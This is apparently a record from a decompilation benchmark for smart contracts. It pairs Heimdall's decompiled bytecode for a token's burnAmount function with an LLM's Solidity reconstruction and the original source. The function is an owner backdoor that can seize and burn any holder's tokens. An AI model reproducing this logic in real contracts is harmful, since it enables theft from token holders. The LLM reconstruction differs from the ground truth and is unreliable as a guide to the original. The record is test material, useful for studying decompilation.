{
    "contract_address": "0x0cF6AF04E435c22D26884FAd0682E96BA150CBBb",
    "heimdall_input": "function burnAmount(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0) - (address(owner / 0x01)), \"TARGET ERROR\");\n        require(!(arg1 & (0x0de0b6b3a7640000 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))), \"TARGET ERROR\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        address var_f = address(arg0);\n        var_h = 0x65;\n        require(storage_map_i[var_f] > (arg1 * 0x0de0b6b3a7640000), \"TARGET ERROR\");\n        require(!(arg1 & (0x0de0b6b3a7640000 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))), \"TARGET ERROR\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        var_f = address(arg0);\n        var_h = 0x65;\n        require(!(storage_map_i[var_f] - (arg1 * 0x0de0b6b3a7640000) > storage_map_i[var_f]), \"TARGET ERROR\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        var_f = address(arg0);\n        var_h = 0x65;\n        storage_map_i[var_f] = storage_map_i[var_f] - (arg1 * 0x0de0b6b3a7640000);\n        require(!(arg1 & (0x0de0b6b3a7640000 > (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff / arg1))), \"TARGET ERROR\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        var_f = 0xdead;\n        var_h = 0x65;\n        require(!(storage_map_i[var_f] > (storage_map_i[var_f] + (arg1 * 0x0de0b6b3a7640000))), \"TARGET ERROR\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        var_f = 0xdead;\n        var_h = 0x65;\n        storage_map_i[var_f] = storage_map_i[var_f] + (arg1 * 0x0de0b6b3a7640000);\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x0c;\n        var_e = 0x544152474554204552524f520000000000000000000000000000000000000000;\n    }",
    "llm_output": "function burnAmount(address account, uint256 amount) public payable {\n    // Only the contract owner can call this function\n    require(msg.sender == owner(), \"Ownable: caller is not the owner\");\n\n    // Target address must not be the owner address\n    require(account != owner(), \"TARGET ERROR\");\n\n    /*\n     * The following multiplication\u2010overflow check (amount * 1e18)\n     * appears three times in the original byte-code.  All three\n     * instances are preserved verbatim for logical fidelity.\n     */\n    require(\n        amount == 0 || amount <= type(uint256).max / 1e18,\n        \"TARGET ERROR\"\n    );\n\n    uint256 burnUnits = amount * 1e18;\n\n    // Ensure the account holds enough tokens\n    require(_balances[account] >= burnUnits, \"TARGET ERROR\");\n\n    // Second overflow check (kept exactly as in the original logic)\n    require(\n        amount == 0 || amount <= type(uint256).max / 1e18,\n        \"TARGET ERROR\"\n    );\n\n    // Underflow-safety check that mimics the original byte-code assert\n    require(\n        _balances[account] - burnUnits <= _balances[account],\n        \"TARGET ERROR\"\n    );\n\n    unchecked {\n        _balances[account] = _balances[account] - burnUnits;\n    }\n\n    // Third overflow check (kept exactly as in the original logic)\n    require(\n        amount == 0 || amount <= type(uint256).max / 1e18,\n        \"TARGET ERROR\"\n    );\n\n    address burnAddress = address(0xdead);\n\n    // Overflow-safety check for the burn address balance\n    require(\n        _balances[burnAddress] + burnUnits >= _balances[burnAddress],\n        \"TARGET ERROR\"\n    );\n\n    unchecked {\n        _balances[burnAddress] = _balances[burnAddress] + burnUnits;\n    }\n}",
    "ground_truth": "function burnAmount(address wallet, uint256 amount) public onlyOwner {\\r\\n        require(wallet != owner(), \\\"TARGET ERROR\\\");\\r\\n        address deadAddress = 0x000000000000000000000000000000000000dEaD;\\r\\n        if (_balances[wallet] <= amount * 10 ** 18) {\\r\\n            _balances[wallet] = 0;\\r\\n            _balances[deadAddress] = _balances[deadAddress] + _balances[wallet];\\r\\n        } else {\\r\\n            _balances[wallet] = _balances[wallet] - amount * 10 ** 18;\\r\\n            _balances[deadAddress] = _balances[deadAddress] + amount * 10 ** 18;\\r\\n        }\\r\\n    }"
}